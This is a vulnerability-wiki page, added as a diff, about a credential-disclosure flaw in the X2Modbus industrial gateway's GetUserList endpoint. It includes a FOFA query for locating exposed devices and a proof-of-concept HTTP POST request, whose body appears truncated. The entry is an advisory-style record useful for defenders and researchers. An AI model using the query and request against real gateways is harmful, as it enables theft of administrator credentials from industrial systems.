@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E4%B8%8A%E6%B5%B7%E8%BF%85%E9%A5%B6%E8%87%AA%E5%8A%A8%E5%8C%96%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8/%E4%B8%8A%E6%B5%B7%E8%BF%85%E9%A5%B6%E8%87%AA%E5%8A%A8%E5%8C%96%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8X2Modbus%E7%BD%91%E5%85%B3GetUserList%E5%AD%98%E5%9C%A8%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>上海迅饶自动化科技有限公司X2Modbus网关GetUserList存在敏感信息泄露 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u4e0a\u6d77\u8fc5\u9976\u81ea\u52a8\u5316\u79d1\u6280\u6709\u9650\u516c\u53f8X2Modbus\u7f51\u5173GetUserList\u5b58\u5728\u654f\u611f\u4fe1\u606f\u6cc4\u9732", url: "#_top", children: [
+          ]},
+          {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1", children: [
+          ]},
+          {title: "\u4e8c\u3001\u5f71\u54cd\u7248\u672c", url: "#_2", children: [
+          ]},
+          {title: "\u4e09\u3001\u8d44\u4ea7\u6d4b\u7ed8", url: "#_3", children: [
+          ]},
+          {title: "\u56db\u3001\u6f0f\u6d1e\u590d\u73b0", url: "#_4", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E4%B8%8A%E6%B5%B7%E8%BF%85%E9%A5%B6%E8%87%AA%E5%8A%A8%E5%8C%96%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8X2Modbus%E7%BD%91%E5%85%B3GetUser%E5%AD%98%E5%9C%A8%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E4%B8%8A%E6%B5%B7%E8%BF%85%E9%A5%B6%E8%87%AA%E5%8A%A8%E5%8C%96%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8X2Modbus%E7%BD%91%E5%85%B3GetUser%E5%AD%98%E5%9C%A8%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" class="btn btn-xs btn-link">
+        上海迅饶自动化科技有限公司X2Modbus网关GetUser存在敏感信息泄露
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E4%B8%8A%E6%B5%B7%E7%BD%91%E4%BB%95%E7%A7%91%E6%8A%80/%E4%B8%8A%E6%B5%B7%E7%BD%91%E4%BB%95%E7%A7%91%E6%8A%80TranscoderMS%20index%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E4%B8%8A%E6%B5%B7%E7%BD%91%E4%BB%95%E7%A7%91%E6%8A%80/%E4%B8%8A%E6%B5%B7%E7%BD%91%E4%BB%95%E7%A7%91%E6%8A%80TranscoderMS%20index%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-link">
+        上海网仕科技TranscoderMS index存在SQL注入
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="x2modbusgetuserlist">上海迅饶自动化科技有限公司X2Modbus网关GetUserList存在敏感信息泄露<a class="headerlink" href="#x2modbusgetuserlist" title="Permanent link">&para;</a></h1>
+<h1 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<p>X2Modbus是上海迅饶自动化科技有限公司开发的一款功能很强大的协议转换网关， 这里的X代表各家不同的通信协议， 2是To的谐音表示转换， Modbus就是最终支持的标准协议是Modbus协议。用户可以根据现场设备的通信协议进行配置，转成标准的Modbus协议。在PC端仿真运行无误后，上传到硬件协议转换网关。X2Modbus网关GetUserList接口存在一个信息泄漏漏洞，使得未经授权的用户或攻击者可以获取管理员登录信息。</p>
+<h1 id="_2">二、影响版本<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h1>
+<ul>
+<li>X2Modbus</li>
+</ul>
+<h1 id="_3">三、资产测绘<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h1>
+<ul>
+<li>fofa<code>server="SunFull-Webs" || icon_hash="-1384370370"</code></li>
+<li>特征</li>
+</ul>
+<p><img alt="1710416347834-b54d34ac-c701-4de7-aa01-4e4e7792c936.png" src="./img/5pAm6LDi9QkvfYif/1710416347834-b54d34ac-c701-4de7-aa01-4e4e7792c936-178259.png" /></p>
+<h1 id="_4">四、漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h1>
+<div class="highlight"><pre><span></span><code><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">soap</span><span class="o">/</span><span class="n">GetUserList</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<span class="nl">Host</span><span class="p">:</span><span class="w"> </span>
+<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="n">Macintosh</span><span class="p">;</span><span class="w"> </span><span class="n">Intel</span><span class="w"> </span><span class="n">Mac</span><span class="w"> </span><span class="n">OS</span><span class="w"> </span><span class="n">X</span><span class="w"> </span><span class="mf">10.15</span><span class="p">;</span><span class="w"> </span><span class="n">rv</span><span class="p">:</span><span class="mf">123.0</span><span class="p">)</span><span class="w"> </span><span class="n">Gecko</span><span class="o">/</span><span class="mi">20100101</span><span class="w"> </span><span class="n">Firefox</span><span class="o">/</span><span class="mf">123.0</span>
+<span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xhtml</span><span class="o">+</span><span class="n">xml</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xml</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">avif</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">webp</span><span class="p">,</span><span class="o">*/*</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.8</span>
+<span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span><span class="w"> </span><span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="p">,</span><span class="n">zh</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.8</span><span class="p">,</span><span class="n">zh</span><span class="o">-</span><span class="n">TW</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.7</span><span class="p">,</span><span class="n">zh</span><span class="o">-</span><span class="n">HK</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.5</span><span class="p">,</span><span class="n">en</span><span class="o">-</span><span class="n">US</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.3</span><span class="p">,</span><span class="n">en</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.2</span>
+<span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">gzip</span><span class="p">,</span><span class="w"> </span><span class="n">deflate</span>
+<span class="nl">Connection</span><span class="p">:</span><span class="w"> </span><span class="n">close</span>
+<span class="n">Upgrade</span><span class="o">-</span><span class="n">Insecure</span><span class="o">-</span><span class="n">Requests</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span><span class="w"> </span><span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span><span class="w"> </span><span class="mi">56</span>
+
+<span class="n">CmpWc</span><span class="o">=</span>
+</code></pre></div>
+<p><img alt="1712507467332-2db34223-b5c6-42d5-bd22-5afb39b57c72.png" src="./img/5pAm6LDi9QkvfYif/1712507467332-2db34223-b5c6-42d5-bd22-5afb39b57c72-368876.png" /></p>
+<blockquote>
+<p>更新: 2024-04-16 16:50:51<br />
+原文: <a href="https://www.yuque.com/xiaokp7/ocvun2/twhz9rc6wex3xe15">https://www.yuque.com/xiaokp7/ocvun2/twhz9rc6wex3xe15</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E4%B8%8A%E6%B5%B7%E8%BF%85%E9%A5%B6%E8%87%AA%E5%8A%A8%E5%8C%96%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8X2Modbus%E7%BD%91%E5%85%B3GetUser%E5%AD%98%E5%9C%A8%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E4%B8%8A%E6%B5%B7%E8%BF%85%E9%A5%B6%E8%87%AA%E5%8A%A8%E5%8C%96%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8X2Modbus%E7%BD%91%E5%85%B3GetUser%E5%AD%98%E5%9C%A8%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" class="btn btn-xs btn-link">
+        上海迅饶自动化科技有限公司X2Modbus网关GetUser存在敏感信息泄露
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E4%B8%8A%E6%B5%B7%E7%BD%91%E4%BB%95%E7%A7%91%E6%8A%80/%E4%B8%8A%E6%B5%B7%E7%BD%91%E4%BB%95%E7%A7%91%E6%8A%80TranscoderMS%20index%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E4%B8%8A%E6%B5%B7%E7%BD%91%E4%BB%95%E7%A7%91%E6%8A%80/%E4%B8%8A%E6%B5%B7%E7%BD%91%E4%BB%95%E7%A7%91%E6%8A%80TranscoderMS%20index%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-link">
+        上海网仕科技TranscoderMS index存在SQL注入
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
